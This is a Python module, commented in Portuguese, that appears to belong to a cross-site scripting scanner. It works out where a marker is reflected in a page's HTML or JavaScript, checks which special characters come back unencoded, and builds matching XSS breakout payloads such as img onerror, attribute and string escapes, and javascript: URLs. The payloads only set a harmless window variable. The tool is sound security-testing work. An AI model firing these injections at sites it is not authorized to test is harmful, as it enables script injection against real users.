# -*- coding: utf-8 -*-
"""
Análise de contexto de reflexão e geração de payloads de PROVA.

A filosofia da ferramenta: injetar marcadores e payloads que PROVAM a execução
(um alert/variável única e inofensiva), nunca payloads que roubam dados. A
precisão vem de confirmar a execução real (ver confirmacao.py), não de causar
dano.
"""

import random
import re
import string


def novo_marcador(prefixo="kzx"):
    aleat = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefixo}{aleat}"


# Caracteres cuja reflexão sem codificação abre cada contexto.
CARACTERES_PERIGOSOS = {
    "<": "abertura de tag — permite injetar elementos (ex.: <script>, <img>)",
    ">": "fecho de tag — devolve ao fluxo HTML",
    '"': "aspas duplas — permite sair de um atributo",
    "'": "aspas simples — permite sair de um atributo ou string JS",
    "`": "crase — permite sair de template strings em JS",
    "(": "parêntese — permite chamar funções JS",
    ")": "parêntese — permite chamar funções JS",
    "{": "chave — relevante em alguns contextos JS/template",
    "}": "chave — relevante em alguns contextos JS/template",
    "/": "barra — permite fechar tags (ex.: </script>)",
    "=": "igual — permite criar atributos (ex.: onerror=)",
    ";": "ponto e vírgula — separa instruções JS",
}


# Nomes de contexto
CORPO_HTML = "corpo_html"
ATTR_DUPLAS = "atributo_aspas_duplas"
ATTR_SIMPLES = "atributo_aspas_simples"
ATTR_SEM_ASPAS = "atributo_sem_aspas"
DENTRO_TAG = "dentro_de_tag"
JS_STRING_DUPLAS = "js_string_aspas_duplas"
JS_STRING_SIMPLES = "js_string_aspas_simples"
JS_STRING_CRASE = "js_template_string"
JS_BLOCO = "js_bloco"
COMENTARIO = "comentario_html"
ATTR_URL = "atributo_url"
DESCONHECIDO = "desconhecido"


EXPLICACAO = {
    CORPO_HTML:
        "O valor é escrito diretamente no corpo da página. Com '<' e '>' livres, "
        "injeta-se HTML novo (ex.: <img src=x onerror=...>) que o navegador executa.",
    ATTR_DUPLAS:
        "O valor fica num atributo entre aspas duplas. Com '\"' livre, fecha-se o "
        "atributo e acrescenta-se um manipulador de evento.",
    ATTR_SIMPLES:
        "O valor fica num atributo entre aspas simples. Com \"'\" livre, fecha-se o "
        "atributo e acrescenta-se um manipulador de evento.",
    ATTR_SEM_ASPAS:
        "O valor fica num atributo sem aspas. Basta um espaço para acrescentar um "
        "atributo novo, como onmouseover=, sem precisar de aspas.",
    DENTRO_TAG:
        "O valor cai dentro da própria tag. Pode acrescentar-se um atributo/evento novo.",
    JS_STRING_DUPLAS:
        "O valor fica numa string JS com aspas duplas, dentro de <script>. Com '\"' "
        "livre sai-se da string e corre-se código.",
    JS_STRING_SIMPLES:
        "O valor fica numa string JS com aspas simples, dentro de <script>. Com \"'\" "
        "livre sai-se da string e corre-se código.",
    JS_STRING_CRASE:
        "O valor fica numa template string (crase). Com '`' ou '${' injeta-se código.",
    JS_BLOCO:
        "O valor cai diretamente num bloco <script>, fora de string. Corre como código.",
    COMENTARIO:
        "O valor cai num comentário HTML. Fechando com '-->' o resto vira HTML normal.",
    ATTR_URL:
        "O valor é usado como URL (href/src). Um esquema javascript: pode executar código.",
    DESCONHECIDO:
        "O valor reflete-se num contexto não classificado; requer análise manual.",
}


def detetar_contexto(corpo, marcador):
    """Descobre em que contexto do HTML/JS o marcador foi refletido."""
    idx = corpo.find(marcador)
    if idx == -1:
        return None, ""

    ini = max(0, idx - 80)
    fim = min(len(corpo), idx + len(marcador) + 80)
    trecho = corpo[ini:fim].replace("\n", " ")
    antes = corpo[:idx]
    antes_l = antes.lower()

    # Comentário HTML?
    if antes_l.rfind("<!--") > antes_l.rfind("-->"):
        return COMENTARIO, trecho

    # Dentro de <script>...</script>?
    ab_script = antes_l.rfind("<script")
    if ab_script != -1 and antes_l.rfind("</script>") < ab_script:
        # Estamos em JS. Em que subcontexto?
        js = antes[antes_l.rfind(">", ab_script) + 1:]
        if _string_aberta(js, '"'):
            return JS_STRING_DUPLAS, trecho
        if _string_aberta(js, "'"):
            return JS_STRING_SIMPLES, trecho
        if _string_aberta(js, "`"):
            return JS_STRING_CRASE, trecho
        return JS_BLOCO, trecho

    # Dentro de uma tag (abriu '<' e ainda não fechou '>')?
    ab = antes.rfind("<")
    fe = antes.rfind(">")
    if ab > fe:
        # valor de atributo?
        if re.search(r'=\s*"[^"]*$', antes):
            # é um atributo de URL?
            if re.search(r'\b(href|src|action|formaction)\s*=\s*"[^"]*$',
                         antes_l):
                return ATTR_URL, trecho
            return ATTR_DUPLAS, trecho
        if re.search(r"=\s*'[^']*$", antes):
            if re.search(r"\b(href|src|action|formaction)\s*=\s*'[^']*$",
                         antes_l):
                return ATTR_URL, trecho
            return ATTR_SIMPLES, trecho
        if re.search(r"=\s*[^\s\"'>]*$", antes):
            return ATTR_SEM_ASPAS, trecho
        return DENTRO_TAG, trecho

    return CORPO_HTML, trecho


def _string_aberta(js, aspas):
    """Heurística: há um número ímpar de 'aspas' não escapadas => string aberta."""
    cont = 0
    i = 0
    while i < len(js):
        c = js[i]
        if c == "\\":
            i += 2
            continue
        if c == aspas:
            cont += 1
        i += 1
    return cont % 2 == 1


def caracteres_livres(corpo, meia1, meia2):
    """Caracteres perigosos que voltaram crus entre os dois marcadores."""
    i = corpo.find(meia1)
    if i == -1:
        return []
    ini = i + len(meia1)
    fim = corpo.find(meia2, ini)
    if fim == -1:
        return []
    seg = corpo[ini:fim]
    return [c for c in CARACTERES_PERIGOSOS if c in seg]


def sonda_caracteres(meia1, meia2):
    """String que injeta todos os caracteres perigosos entre dois marcadores."""
    return meia1 + "".join(CARACTERES_PERIGOSOS.keys()) + meia2


def _requisitos(contexto):
    """Que caracteres são precisos para o contexto ser explorável."""
    return {
        CORPO_HTML: {"<", ">"},
        COMENTARIO: {"<", ">"},
        ATTR_DUPLAS: {'"'},
        ATTR_SIMPLES: {"'"},
        ATTR_SEM_ASPAS: {"="},          # espaço é quase sempre permitido
        DENTRO_TAG: {"="},
        JS_STRING_DUPLAS: {'"'},
        JS_STRING_SIMPLES: {"'"},
        JS_STRING_CRASE: {"`"},
        JS_BLOCO: set(),                 # já está em JS
        ATTR_URL: set(),                 # javascript: não precisa destes
    }.get(contexto, {"<", ">"})


def parece_exploravel(contexto, livres):
    req = _requisitos(contexto)
    livres = set(livres)
    if contexto == ATTR_URL:
        return True  # confirma-se com payload javascript: + headless
    if contexto == JS_BLOCO:
        return True
    return req.issubset(livres)


def payload_dom_sem_espacos(token):
    """
    Payload para injeção via fragmento (#): sem espaços nem aspas, porque o
    navegador codifica-os no location.hash. Usa '/' como separador de atributos
    e um identificador JS válido (o token) em vez de uma string entre aspas.
    """
    return f"<img src=x onerror=window.{token}=1>"


def payload_prova(contexto, token):
    """
    Devolve um payload de PROVA que, se executar, define window.<token>=1 e
    dispara console.log(<token>). Inofensivo: não lê nem envia dados.
    """
    js = f"window['{token}']=1;console.log('{token}')"
    if contexto in (CORPO_HTML, COMENTARIO, DENTRO_TAG, ATTR_SEM_ASPAS):
        pre = "-->" if contexto == COMENTARIO else ""
        return f'{pre}<img src=x onerror="{js}">'
    if contexto == ATTR_DUPLAS:
        return f'"><img src=x onerror="{js}">'
    if contexto == ATTR_SIMPLES:
        return f"'><img src=x onerror='{js}'>"
    if contexto == ATTR_URL:
        return f"javascript:{js}"
    if contexto == JS_STRING_DUPLAS:
        return f'";{js};//'
    if contexto == JS_STRING_SIMPLES:
        return f"';{js};//"
    if contexto == JS_STRING_CRASE:
        return f"`;{js};//"
    if contexto == JS_BLOCO:
        return f"{js};//"
    return f'<img src=x onerror="{js}">'
